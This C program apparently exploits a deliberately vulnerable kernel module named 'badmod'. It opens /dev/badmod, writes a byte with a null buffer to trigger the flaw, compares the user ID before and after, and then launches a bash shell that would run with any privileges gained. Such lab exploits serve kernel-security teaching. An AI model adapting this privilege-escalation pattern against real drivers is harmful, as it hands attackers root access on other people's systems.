#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <fcntl.h>

int main(int argc, char *argv[])
{
	int fd_dev = -1;
	ssize_t	ret;
	uid_t uid;

	/* open device */
	fd_dev = open("/dev/badmod", O_RDWR);

	if (fd_dev == -1) {
		perror("device open");
		goto exit;
	}

	uid = getuid();
	printf("before uid is: %d\n", uid);

	/* issue write */
	ret = write(fd_dev, 0, 1);

	uid = getuid();
	printf("after uid is: %d\n", uid);

	execl("/bin/bash", "/bin/bash", NULL, (char *) NULL);

	/*--------------------------------------------*/
	/* clean-up                                   */
	/*--------------------------------------------*/
	exit:
 		close(fd_dev);
		printf("%s exiting\n", argv[0]);
		return 0;
}
